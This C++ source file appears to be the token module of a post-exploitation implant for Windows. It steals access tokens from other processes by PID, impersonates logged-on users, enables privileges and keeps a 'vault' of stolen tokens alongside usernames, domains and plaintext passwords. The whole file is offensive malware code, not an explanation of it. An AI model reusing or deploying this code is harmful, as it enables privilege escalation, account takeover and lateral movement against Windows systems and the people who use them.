#include <commands/include/tokens.hpp>
namespace Token {

	BOOL RevertToken() {
		HEXANE

		HANDLE hToken = { };
		if (NT_SUCCESS(ntstatus = Ctx->Nt.NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &hToken, sizeof(HANDLE)))) {
			return TRUE;
		}

		return FALSE;
	}

	BOOL TokenImpersonate(BOOL Impersonate) {
		HEXANE

		BOOL Success = FALSE;
		if (Impersonate && !Ctx->Tokens.Impersonate && Ctx->Tokens.Token) {
			if (!(Ctx->Tokens.Impersonate = Ctx->win32.ImpersonateLoggedOnUser(Ctx->Tokens.Token->Handle))) {
				return_defer(ERROR_CANNOT_IMPERSONATE);
			}
		} else if (!Impersonate && Ctx->Tokens.Impersonate) {
			Ctx->Tokens.Impersonate = FALSE;
			Success = RevertToken();

		} else if (Impersonate && !Ctx->Tokens.Token) {
			Success = TRUE;
		} else if (Impersonate && Ctx->Tokens.Impersonate) {
			Success = TRUE;
		} else if (Impersonate && !Ctx->Tokens.Impersonate) {
			Success = TRUE;
		}

		defer:
		return Success;
	}

	VOID DuplicateToken(HANDLE orgToken, DWORD Access, SECURITY_IMPERSONATION_LEVEL Level, TOKEN_TYPE Type, PHANDLE newToken) {
		HEXANE

		OBJECT_ATTRIBUTES Attrs				= { };
		SECURITY_QUALITY_OF_SERVICE Sqos	= { };

		Sqos.Length				    = sizeof(SECURITY_QUALITY_OF_SERVICE);
		Sqos.ImpersonationLevel     = Level;
		Sqos.ContextTrackingMode	= 0;
		Sqos.EffectiveOnly			= FALSE;

		InitializeObjectAttributes(&Attrs, nullptr, 0, nullptr, nullptr);
		Attrs.SecurityQualityOfService = &Sqos;

		ntstatus = Ctx->Nt.NtDuplicateToken(orgToken, Access, &Attrs, FALSE, Type, newToken);
	}

	VOID SetTokenPrivilege(LPWSTR Privilege, BOOL Enable) {
		HEXANE

		TOKEN_PRIVILEGES tokenPriv	= { };
		HANDLE hToken 				= { };
		LUID Luid 					= { };

		if (!LookupPrivilegeValueW(nullptr, Privilege, &Luid)) {
			return_defer(ERROR_PRIVILEGE_NOT_HELD);
		}

		tokenPriv.PrivilegeCount		= 1;
		tokenPriv.Privileges[0].Luid	= Luid;

		Enable
		? tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
		: tokenPriv.Privileges[0].Attributes = NULL;

		if (
			!NT_SUCCESS(Ctx->Nt.NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) ||
			!Ctx->win32.AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, 0, nullptr, nullptr)) {
			return_defer(ERROR_INVALID_TOKEN);
		}

		defer:
	}

	HANDLE StealProcessToken(HANDLE hTarget, DWORD Pid) {
		HEXANE

		HANDLE hProcess		= { };
		HANDLE hDuplicate	= { };

		if (!NT_SUCCESS(Process::NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, Pid))) {
			return_defer(ntstatus);
		}

		if (hTarget) {
			if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtDuplicateObject(hProcess, hTarget, NtCurrentProcess(), &hDuplicate, 0, 0, DUPLICATE_SAME_ACCESS))) {
				return_defer(ntstatus);
			}
		} else {
			if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hDuplicate))) {
				return_defer(ntstatus);
			}
		}

		defer:
		if (hProcess) {
			Ctx->Nt.NtClose(hProcess);
		}

		return hDuplicate;
	}

	PTOKEN_LIST_DATA GetToken(DWORD tokenId) {
		HEXANE

		PTOKEN_LIST_DATA Head	= Ctx->Tokens.Vault;
		DWORD Index				= 0;

		for ( ;Index < tokenId && Head && Head->Next; ++Index) {
			Head = Head->Next;
		}
		if (Index != tokenId) {
			return nullptr;
		}

		return Head;
	}

	DWORD AddToken(HANDLE hToken, LPWSTR Username, SHORT Type, DWORD Pid, LPWSTR DomainUser, LPWSTR Domain, LPWSTR Password) {
		HEXANE

		PTOKEN_LIST_DATA Head	= { };
		PTOKEN_LIST_DATA Entry	= { };
		DWORD Index				= 0;

		Entry = R_CAST(PTOKEN_LIST_DATA, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(TOKEN_LIST_DATA)));

		Entry->Handle		= hToken;
		Entry->lpUser		= Username;
		Entry->dwProcessID	= Pid;
		Entry->Type			= Type;
		Entry->DomainUser	= DomainUser;
		Entry->lpDomain		= Domain;
		Entry->lpPassword	= Password;
		Entry->Next			= nullptr;

		if (Ctx->Tokens.Vault == nullptr) {
			Ctx->Tokens.Vault = Entry;
			return Index;
		}

		Head = Ctx->Tokens.Vault;
		while (Head->Next) {
			Head = Head->Next;
			Index++;
		}

		Head->Next = Entry;
		Index++;

		return Index;
	}

	BOOL RemoveToken(DWORD tokenId) {
		HEXANE

		PTOKEN_LIST_DATA Head	= Ctx->Tokens.Vault;
		PTOKEN_LIST_DATA Entry	= GetToken(tokenId);
		PTOKEN_LIST_DATA Prev	= { };

		if (!Entry) {
			return FALSE;
		}

		while (Head) {
			if (Head == Entry) {
				if (Head == Ctx->Tokens.Vault) {
					Ctx->Tokens.Vault = Entry->Next;

				} else {
					Prev = Ctx->Tokens.Vault;
					while (Prev && Prev->Next != Entry) {
						Prev = Prev->Next;
					}
					if (Prev) {
						Prev->Next = Entry->Next;
					}
				}

				if (Ctx->Tokens.Impersonate && Ctx->Tokens.Token->Handle == Entry->Handle) {
					TokenImpersonate(FALSE);
				}

				if (Entry->Handle) {
					Ctx->Nt.NtClose(Entry->Handle);
					Entry->Handle = nullptr;
				}

				if (Entry->DomainUser) {
					x_memset(Entry->DomainUser, 0, x_wcslen(Entry->DomainUser) * sizeof(WCHAR));
					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Entry->DomainUser);
					Entry->DomainUser = nullptr;
				}

				if (Entry->lpUser) {
					x_memset(Entry->lpUser, 0, x_wcslen(Entry->lpUser) * sizeof(WCHAR));
					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Entry->lpUser);
					Entry->lpUser = nullptr;
				}

				if (Entry->lpDomain) {
					x_memset(Entry->lpDomain, 0, x_wcslen(Entry->lpDomain) * sizeof(WCHAR));
					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Entry->lpDomain);
					Entry->lpDomain = nullptr;
				}

				if (Entry->lpPassword) {
					x_memset(Entry->lpPassword, 0, x_wcslen(Entry->lpPassword) * sizeof(WCHAR));
					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Entry->lpPassword);
					Entry->lpPassword = nullptr;
				}

				x_memset(Entry, 0, sizeof(TOKEN_LIST_DATA));
				Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Entry);

				return TRUE;
			}

			Head = Head->Next;
		}

		return FALSE;
	}
}
